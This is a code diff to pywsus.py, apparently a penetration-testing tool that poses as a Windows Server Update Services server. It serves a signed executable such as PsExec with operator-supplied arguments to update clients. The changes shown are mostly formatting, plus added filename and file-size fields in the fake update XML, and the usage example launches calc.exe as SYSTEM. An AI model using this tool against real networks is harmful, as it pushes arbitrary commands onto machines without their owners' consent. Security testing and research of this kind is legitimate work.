@@ -44,7 +44,7 @@ class Update:
         return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()
 
     def set_resources_xml(self, command):
-        #init resources
+        # init resources
 
         path = os.path.abspath(os.path.dirname(__file__))
 
@@ -66,7 +66,8 @@ class Update:
 
             with open('{}/resources/get-extended-update-info.xml'.format(path), 'r') as file:
                 self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1], sha1=self.sha1, sha256=self.sha256,
-                                                                       url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name), command=html.escape(html.escape(command)))
+                                                                       filename=self.executable_name, file_size=len(executable_file), command=html.escape(html.escape(command)),
+                                                                       url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name))
                 file.close()
 
             with open('{}/resources/report-event-batch.xml'.format(path), 'r') as file:
@@ -105,7 +106,7 @@ class S(BaseHTTPRequestHandler):
 
         self.send_response(200)
         self.server_version = 'Microsoft-IIS/10.0'
-        #self.send_header('Accept-Ranges', 'bytes')
+        # self.send_header('Accept-Ranges', 'bytes')
         self.send_header('Cache-Control', 'private')
 
         if serveEXE:
@@ -233,15 +234,10 @@ def parse_args():
     parser = argparse.ArgumentParser(epilog='\tExample: \r\npython pywsus.py -H X.X.X.X -p 8530 -e PsExec64.exe -c "-accepteula -s calc.exe"')
 
     parser._optionals.title = "OPTIONS"
-
     parser.add_argument('-H', '--host', required=True, help='The listening adress.')
-
     parser.add_argument('-p', '--port', type=int, default=8530, help='The listening port.')
-
     parser.add_argument('-e', '--executable', type=argparse.FileType('rb'), required=True, help='The Microsoft signed executable returned to the client.')
-
     parser.add_argument('-c', '--command', required=True, help='The parameters for the current executable.')
-
     parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Increase output verbosity.')
 
     return parser.parse_args()
